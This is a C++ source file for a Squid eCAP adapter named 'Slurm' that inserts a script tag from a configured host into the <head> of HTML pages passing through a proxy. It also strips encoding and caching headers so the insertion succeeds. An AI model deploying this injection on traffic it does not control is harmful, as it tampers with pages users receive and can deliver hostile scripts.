#include "slurm.h"
#include <iostream>
#include <libecap/common/registry.h>
#include <libecap/common/errors.h>
#include <libecap/common/message.h>
#include <libecap/common/header.h>
#include <libecap/common/names.h>
#include <libecap/host/host.h>
#include <libecap/adapter/service.h>
#include <libecap/adapter/xaction.h>
#include <libecap/host/xaction.h>

#include "config.h"

#include <string.h>
#include <strings.h>
#include <ctype.h>
#include <fstream>
#include <algorithm>

#define LENGTH(a) ( sizeof (a) / sizeof (*a) )

#ifdef DEBUG
    #define LOG(msg) (log << __FILE__ << ":" << __FUNCTION__ << ":" \
        << __LINE__ << " -- " << msg << std::endl)
#else
    #define LOG(msg)
#endif

static std::ofstream log;

// Case insensitive equals functions for characters
// http://stackoverflow.com/questions/3542030/extending-c-string-member-functions
bool iequal(char ch1, char ch2) {
    return tolower((unsigned char)ch1) == tolower((unsigned char)ch2);
}

// Case insensitive find function to find str2 within str1.
// Return: position of first occurance, else std::string::npos
size_t ifind(const std::string& str1, const std::string& str2,
             size_t start = 0) {
    std::string::const_iterator pos = std::search(
                                        str1.begin() + start, str1.end(),
                                        str2.begin(), str2.end(), iequal);
    if (pos == str1.end()) {
        return std::string::npos;
    } else {
        return pos - str1.begin();
    }
}

// Validates the extensions of the URL against a list to see if we should
// ignore injection of this file type.
bool validateExtensions(const std::string uri) {
    std::string url = uri;
    if (url.size() == 0) return false;
    for (int i=0; i < (int) LENGTH(config::extensions); i++) {
        std::string exten = config::extensions[i];
        std::string file;
        size_t pos = url.find('?');
        if (pos != std::string::npos) {
            file = url.substr(0,pos);
        } else {
            file = url;
        }

        if (ifind(file,exten) != std::string::npos) {
            return false;
        }
    }
    return true;
}

namespace Adapter { // not required, but adds clarity

using libecap::size_type;
//using namespace libconfig;

class Service: public libecap::adapter::Service {
	public:
		// About
		virtual std::string uri() const; // unique across all vendors
		virtual std::string tag() const; // changes with version and config
		virtual void describe(std::ostream &os) const; // free-format info

		// Configuration
        virtual void configure(const Config &cfg);
		virtual void reconfigure(const Config &cfg);

		// Lifecycle
		virtual void start(); // expect makeXaction() calls
		virtual void stop(); // no more makeXaction() calls until start()
		virtual void retire(); // no more makeXaction() calls

		// Scope (XXX: this may be changed to look at the whole header)
		virtual bool wantsUrl(const char *url) const;

		// Work
		virtual libecap::adapter::Xaction *makeXaction(libecap::host::Xaction *hostx);
};


class Xaction: public libecap::adapter::Xaction {
	public:
		Xaction(libecap::host::Xaction *x);
		virtual ~Xaction();

		// lifecycle
		virtual void start();
		virtual void stop();

        // adapted body transmission control
        virtual void abDiscard();
        virtual void abMake();
        virtual void abMakeMore();
        virtual void abStopMaking();

        // adapted body content extraction and consumption
        virtual libecap::Area abContent(size_type offset, size_type size);
        virtual void abContentShift(size_type size);

        // virgin body state notification
        virtual void noteVbContentDone(bool atEnd);
        virtual void noteVbContentAvailable();

		// libecap::Callable API, via libecap::host::Xaction
		virtual bool callable() const;

	protected:
		bool adaptContent(std::string &chunk); // converts vb to ab
		void stopVb(); // stops receiving vb (if we are receiving it)
		libecap::host::Xaction *lastHostCall(); // clears hostx

	private:
        //libconfig::Config configObj;
        libecap::host::Xaction *hostx; // Host transaction rep

		std::string buffer; // for content adaptation
        std::string part;
        std::string url;
        bool targetOpen;

        bool enableAdapter;

		typedef enum { opUndecided, opOn, opComplete, opNever } OperationState;
		OperationState receivingVb;
		OperationState sendingAb;
};

} // namespace Adapter


std::string Adapter::Service::uri() const {
	return config::service_uri;
}

std::string Adapter::Service::tag() const {
	return PACKAGE_VERSION;
}

void Adapter::Service::describe(std::ostream &os) const {
	os << "Inserts Slurm adapter from " << PACKAGE_NAME << " v" << PACKAGE_VERSION;
}

void Adapter::Service::configure(const Config &) {
    LOG("Executing the configuration function");
}

void Adapter::Service::reconfigure(const Config &) {
    LOG("Executing the reconfiguration function");
}

void Adapter::Service::start() {
    #ifdef DEBUG
        log.open(config::log, std::ios::out | std::ios::app);
    #endif
	LOG("Starting Adapter at " << config::hostname);
    libecap::adapter::Service::start();
}


void Adapter::Service::stop() {
	LOG("Stopping the adapter and closing out config files and stats");
    #ifdef DEBUG
        log.close();
    #endif
    libecap::adapter::Service::stop();
}

void Adapter::Service::retire() {
	libecap::adapter::Service::stop();
}

bool Adapter::Service::wantsUrl(const char *url) const {
    if (url == NULL) return false;
    std::string uri(url);

    #ifdef DEBUG
        log.open(config::log, std::ios::out | std::ios::app);
    #endif
    LOG("URL: " << uri);

    //* Validate URL extension
    if (validateExtensions(uri) == false) {
        LOG("Extension Invalid");
        #ifdef DEBUG
            log.close();
        #endif
        return false;
    }
    //*/

    //* Test for self injection
    if (uri.find(config::script) != std::string::npos) {
        LOG("Invalid Script Name: No self injection");
        #ifdef DEBUG
            log.close();
        #endif
        return false;
    }
    //*/

    #ifdef DEBUG
        log.close();
    #endif
    return true;
}

libecap::adapter::Xaction *Adapter::Service::makeXaction(
                                            libecap::host::Xaction *hostx) {
    return new Adapter::Xaction(hostx);
}


Adapter::Xaction::Xaction(libecap::host::Xaction *x): hostx(x),
	receivingVb(opUndecided), sendingAb(opUndecided) {
}

Adapter::Xaction::~Xaction() {
	if (libecap::host::Xaction *x = hostx) {
		hostx = 0;
		x->adaptationAborted();
	}
}

void Adapter::Xaction::start() {

    #ifdef DEBUG
        log.open(config::log, std::ios::out | std::ios::app);
    #endif

    LOG("Starting Adapter...");
	Must(hostx);

    enableAdapter = false;

    libecap::FirstLine *firstLine = &(hostx->virgin().firstLine());
    libecap::RequestLine *requestLine = NULL;
    libecap::StatusLine *statusLine = NULL;

    // Grab Header and determine if we are doing a request or response
    requestLine = dynamic_cast<libecap::RequestLine*>(firstLine);
    if (requestLine == NULL) {
        LOG("Response");
        statusLine = dynamic_cast<libecap::StatusLine*>(firstLine);
        if (statusLine == NULL || statusLine->statusCode() != 200) {
            sendingAb = opNever;
            lastHostCall()->useVirgin();
            return;
        }
        LOG("StatusCode: 200");
    } else {
        LOG("Request");
        libecap::Area uri = requestLine->uri();

        if (validateExtensions(uri.toString()) == false) {
            sendingAb = opNever;
            lastHostCall()->useVirgin();
            return;
        }
    }

    // Validates the host/domain against the whitelist of hosts that we would
    // like to ignore insertion. see config.h.
    static const libecap::Name headerHost("Host");
    if (hostx->virgin().header().hasAny(headerHost)) {
        libecap::Header::Value hostValue =
            hostx->virgin().header().value(headerHost);
        for (int i=0; i < LENGTH(config::whitelist); i++) {
            LOG("Whitelist: " << config::whitelist[i]);
            if (ifind(hostValue.toString(), config::whitelist[i]) !=
                    std::string::npos) {
                LOG("Found Host in whitelist: Skipping: "
                    << hostValue.start << " and " << config::whitelist[i]);
                sendingAb = opNever;
                lastHostCall()->useVirgin();
                return;
            }
        }
    }

    // Check for Cache-Control no-transform, in both request and response
    static const libecap::Name headerCacheControl("Cache-Control");
    static const std::string cacheControlMatch("no-transform");
    if (hostx->virgin().header().hasAny(headerCacheControl)) {
        libecap::Header::Value cacheControlValue =
            hostx->virgin().header().value(headerCacheControl);
        if (cacheControlValue.size > cacheControlMatch.size()
            && ifind(cacheControlValue.toString(), cacheControlMatch) !=
                std::string::npos) {
            LOG("Found Cache Control no-transform: Skipping.");
            sendingAb = opNever;
            lastHostCall()->useVirgin();
            return;
        }
    }

    // Check for Content-MD5 header, as these should not be altered else they
    // would change the md5 hash of the page content thus invalidating the page
    static const libecap::Name headerContentMD5("Content-MD5");
    if (hostx->virgin().header().hasAny(headerContentMD5)) {
        LOG("Found Content-MD5: Skipping");
        sendingAb = opNever;
        lastHostCall()->useVirgin();
        return;
    }

    if (statusLine != NULL) {
        LOG("Checking Response Headers");

        // Validating the content type of the response for text/html which is
        // the only valid type we support currently.
        static const libecap::Name headerContentType("Content-Type");
        if (hostx->virgin().header().hasAny(headerContentType)) {
            libecap::Header::Value contentTypeValue =
                hostx->virgin().header().value(headerContentType);
            if (contentTypeValue.size == 0
                || ifind(contentTypeValue.toString(), "text/html") ==
                    std::string::npos) {
                LOG("Found Content-Type " << contentTypeValue.start
                    << ": Skipping.");
                sendingAb = opNever;
                lastHostCall()->useVirgin();
                return;
            }
            LOG("Content-Type ok");
        } else {
            LOG("No Content-Type Header in Response");
            sendingAb = opNever;
            lastHostCall()->useVirgin();
            return;
        }

        // Checking for Content Encoding which would break injection.
        static const libecap::Name headerContentEncoding("Content-Encoding");
        if (hostx->virgin().header().hasAny(headerContentEncoding)) {
            LOG("Found Content-Encoding: Skipping.");
            sendingAb = opNever;
            lastHostCall()->useVirgin();
            return;
        }
    }

	if (hostx->virgin().body()) {
		receivingVb = opOn;
		hostx->vbMake();
	} else {
        // we are not interested in vb if there is not one
		receivingVb = opNever;
	}

    libecap::shared_ptr<libecap::Message> adapted = hostx->virgin().clone();
    Must(adapted != 0);

    if (requestLine != NULL) {
        // Handle Request

        // Removes any Encoding headers from the request
        static const libecap::Name headerAcceptEncoding("Accept-Encoding");
        adapted->header().removeAny(headerAcceptEncoding);
        const libecap::Header::Value identityEncoding;
        adapted->header().add(headerAcceptEncoding, identityEncoding);

        // Removes any IF conditional headers from the request
        static const libecap::Name headerIfMatch("If-Match");
        adapted->header().removeAny(headerIfMatch);
        static const libecap::Name headerIfModifiedSince("If-Modified-Since");
        adapted->header().removeAny(headerIfModifiedSince);
        static const libecap::Name headerIfNoneMatch("If-None-Match");
        adapted->header().removeAny(headerIfNoneMatch);
        static const libecap::Name headerIfUnmodifiedSince(
            "If-Unmodified-Since");
        adapted->header().removeAny(headerIfUnmodifiedSince);
    } else {
        // Handle Response

        if (statusLine != NULL && statusLine->statusCode() == 200) {
            // Remove ContentLength header from the response
            adapted->header().removeAny(libecap::headerContentLength);
            enableAdapter = true;
            targetOpen = false;

            // Disable page caching to stop the browser from caching slurm
            static const libecap::Name headerPragma("Pragma");
            adapted->header().removeAny(headerCacheControl);
            adapted->header().removeAny(headerPragma);
            const std::string cacheControlData("no-cache, no-store");
            const libecap::Header::Value cacheControlValue(
                cacheControlData.c_str(), cacheControlData.size());
            adapted->header().add(headerCacheControl, cacheControlValue);
            adapted->header().add(headerPragma, cacheControlValue);

            static const libecap::Name headerDate("Date");
            static const libecap::Name headerLastModified("Last-Modified");
            static const libecap::Name headerExpires("Expires");
            static const std::string expireDate(
                "Mon, 26 Jul 1997 05:00:00 GMT");
            const libecap::Header::Value expireDateValue(
                expireDate.c_str(), expireDate.size());
            if (hostx->virgin().header().hasAny(headerDate)) {
                adapted->header().removeAny(headerLastModified);
                adapted->header().removeAny(headerExpires);
                libecap::Header::Value dateValue =
                    hostx->virgin().header().value(headerDate);
                adapted->header().add(headerLastModified, expireDateValue);
                adapted->header().add(headerExpires, dateValue);
            }
        } else {
            LOG("No StatusLine or not HTTP 200 code.");
        }
    }

	// add a custom header
    // TODO: Determine if this is required, useful or needed. Perhaps it's
    // better to just be transparent about our injection.
	static const libecap::Name name("X-Ecap");
	const libecap::Header::Value value =
		libecap::Area::FromTempString(libecap::MyHost().uri());
	adapted->header().add(name, value);

	if (!adapted->body()) {
		sendingAb = opNever;
		lastHostCall()->useAdapted(adapted);
	} else {
		hostx->useAdapted(adapted);
    }
}

void Adapter::Xaction::stop() {
    LOG("Closing down log and stopping the adapter");
	#ifdef DEBUG
        log.close();
    #endif
    hostx = 0;
    // the caller will delete
}

void Adapter::Xaction::abDiscard()
{
	Must(sendingAb == opUndecided); // have not started yet
	sendingAb = opNever;
	// we do not need more vb if the host is not interested in ab
	stopVb();
}

void Adapter::Xaction::abMake()
{
    // have not yet started or decided not to send
	Must(sendingAb == opUndecided);
	Must(hostx->virgin().body()); // that is our only source of ab content

    // we are or were receiving vb
	Must(receivingVb == opOn || receivingVb == opComplete);

	sendingAb = opOn;
	if (!buffer.empty())
		hostx->noteAbContentAvailable();
}

void Adapter::Xaction::abMakeMore()
{
	Must(receivingVb == opOn); // a precondition for receiving more vb
	hostx->vbMakeMore();
}

void Adapter::Xaction::abStopMaking()
{
	sendingAb = opComplete;
	// we do not need more vb if the host is not interested in more ab
	stopVb();
}


libecap::Area Adapter::Xaction::abContent(size_type offset, size_type size) {
	Must(sendingAb == opOn || sendingAb == opComplete);
	return libecap::Area::FromTempString(buffer.substr(offset, size));
}

void Adapter::Xaction::abContentShift(size_type size) {
	Must(sendingAb == opOn || sendingAb == opComplete);
	buffer.erase(0, size);
}

void Adapter::Xaction::noteVbContentDone(bool atEnd)
{
	Must(receivingVb == opOn);
	receivingVb = opComplete;
	if (sendingAb == opOn) {
		hostx->noteAbContentDone(atEnd);
		sendingAb = opComplete;
	}
}

void Adapter::Xaction::noteVbContentAvailable()
{
	Must(receivingVb == opOn);

	const libecap::Area vb = hostx->vbContent(0, libecap::nsize); // get all vb
	std::string chunk = vb.toString(); // expensive, but simple
	hostx->vbContentShift(vb.size); // we have a copy; do not need vb any more

    // If slurm is enabled, then adapt the content until tag was
    // successfully inserted
    if (enableAdapter) {
        enableAdapter = !adaptContent(chunk);
    }

    buffer += chunk; // buffer what we got

	if (sendingAb == opOn)
		hostx->noteAbContentAvailable();
}

bool Adapter::Xaction::adaptContent(std::string &chunk) {
	static const std::string target = "<head";
    static const std::string uri = config::proto +"://"+ config::hostname +
        config::path + config::script;
	static const std::string tag =
        "<script type=\"text/javascript\" src=\""+ uri +"\"></script>";

	//std::string::size_type pos = 0;
    size_t pos = 0;

    LOG("Adapting Chunk...");

    // Target was found, and we are currently looking for the closing bracket
    if (targetOpen) {
        LOG("Target Found.");
        if ((pos = ifind(chunk, ">", 0))) {
            LOG("Found end of target");
            targetOpen = false;
            chunk.insert(pos + 1, tag);
            return true;
        } else {
            LOG("No end of target found, continue to next chunk");
            return false;
        }
    }

    // Target was found at the end of buffer, cleared and inserting into top of
    // next chunk.
    if (part.length() > 0) {
        LOG("appending partial match '" << part
           << "' to chunk.");
        chunk.insert(0, part);
        part.clear();
    }

    pos = 0;
    int end = 0;
    LOG("Looking for target: " << target);
    while ((pos = ifind(chunk, target, pos)) != std::string::npos) {
        LOG("Found match at position: " << pos);
        end = pos + target.length();
        if (end < chunk.length()) {
            char next = chunk[end];
            // Is this check required? can't we just use ifind() to get it.
            // Looks like it might be required to avoid situations where we are
            // at the end of the buffer. or where target was matched in another
            // string and not really a tag.
            if (next == '>') {
                targetOpen = false;
                chunk.insert(end + 1, tag);
                return true;
            } else if (next == ' ') {
                // We found the target but it does not imediately end. Look for
                // closure within the rest of the chunk
                if ((pos = ifind(chunk, ">", pos + target.length() + 1))
                        != std::string::npos) {
                    // We found the closure within chunk, inserting tag.
                    chunk.insert(pos + 1, tag);
                    return true;
                } else {
                    // We found the target but no end in sight. Leaving open
                    // in order to check for closure in next chunk
                    targetOpen = true;
                    return false;
                }
            } else {
                // Failed to find closure. Perhaps a false positive?
                targetOpen = false;
            }
        } else {
            // Found target however we we need to check the next chunk to be
            // sure as it carries over.
            part = target;
            chunk.erase(pos, target.length());
            return false;
        }
        ++pos;
    }

    // Found in an example:
    // TODO: recode into something more human readable

    // check for partial matches of smaller length
    int i = chunk.length() - 1;
    // We've already search for the whole thing, so we will find at most
    // all but the last character.
    int tagMatchLen = target.length() - 1;
    int j = tagMatchLen - 1; // zero based indexing
    while (j >= 0 && i >= 0) {
        if (target[j] == chunk[i]) {
            --i; --j;
            if (j == -1) {
                part = chunk.substr(chunk.length() - tagMatchLen);
                chunk.erase(chunk.length() - tagMatchLen, tagMatchLen);
                return false;
            }
        } else {
            j = (--tagMatchLen) - 1;
            i = chunk.length() - 1;
        }
    }

    return false;
}

bool Adapter::Xaction::callable() const {
    return hostx != 0; // no point to call us if we are done
}

// tells the host that we are not interested in [more] vb
// if the host does not know that already
void Adapter::Xaction::stopVb() {
	if (receivingVb == opOn) {
		hostx->vbStopMaking();
		receivingVb = opComplete;
	} else {
		// we already got the entire body or refused it earlier
		Must(receivingVb != opUndecided);
	}
}

// this method is used to make the last call to hostx transaction
// last call may delete adapter transaction if the host no longer needs it
// TODO: replace with hostx-independent "done" method
libecap::host::Xaction *Adapter::Xaction::lastHostCall() {
	libecap::host::Xaction *x = hostx;
	Must(x);
	hostx = 0;
	return x;
}

// create the adapter and register with libecap to reach the host application
static const bool Registered = (libecap::RegisterService(new Adapter::Service), true);
